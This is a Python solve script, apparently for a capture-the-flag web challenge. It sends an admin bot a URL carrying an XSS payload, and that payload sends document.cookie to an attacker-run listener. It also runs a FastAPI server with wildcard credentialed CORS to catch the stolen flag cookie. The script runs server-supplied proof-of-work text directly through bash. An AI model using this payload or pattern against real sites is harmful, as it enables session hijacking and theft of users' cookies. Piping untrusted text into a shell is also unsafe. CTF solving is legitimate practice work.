#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import log, process, remote
from uvicorn import Server, Config
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware

from contextlib import asynccontextmanager, contextmanager
from os import environ
from threading import Thread
from time import sleep
from urllib.parse import quote


PROTO = environ.get('PROTO', 'https')
DOMAIN = environ.get('DOMAIN', '1337.sb')
FLAG_EXCHANGED: bool = False


def handle_pow(r):
    r.recvline()
    challenge = r.recvline().decode('ascii').strip()
    log.info(f'Solving pow -> {challenge}')
    p = process(['bash', '-c', challenge])
    solution = p.recvline().strip()
    p.close()
    r.recvuntil(b'solution: ')
    r.sendline(solution)


@asynccontextmanager
async def lifespan(_: FastAPI):
    payload = '<script>fetch(`http://healthcheck:1010/?${encodeURI(document.cookie)}`)</script>'

    io = remote('admin.loc', 1337)
    tmp_data = io.recv(len('proof'), timeout=2)
    if tmp_data == b'proof':
        handle_pow(io)
    else:
        io.unrecv(tmp_data)

    io.sendline(f'{PROTO}://{DOMAIN}/?role={quote(payload)}{"&" * 999}'.encode())
    io.close()

    yield


app = FastAPI(lifespan=lifespan)
app.add_middleware(
    CORSMiddleware,
    allow_origins=['*'],
    allow_headers=['*'],
    allow_methods=['*'],
    allow_credentials=True,
)


@app.get('/')
async def on_cookie(flag: str) -> str:
    global FLAG_EXCHANGED
    print('flag is', flag)
    FLAG_EXCHANGED = 'cr3{' in flag
    return 'ok bro'


class Server(Server):
    def install_signal_handlers(self):
        pass

    @contextmanager
    def run_in_thread(self):
        thread = Thread(target=self.run)
        thread.start()
        try:
            while not self.started:
                sleep(1e-3)
            yield
        finally:
            self.should_exit = True
            thread.join()


if __name__ == '__main__':
    config = Config(app, host='0.0.0.0', port=1010)
    server = Server(config=config)

    with server.run_in_thread():
        while not FLAG_EXCHANGED:
            sleep(0.1)
    
    exit(0)
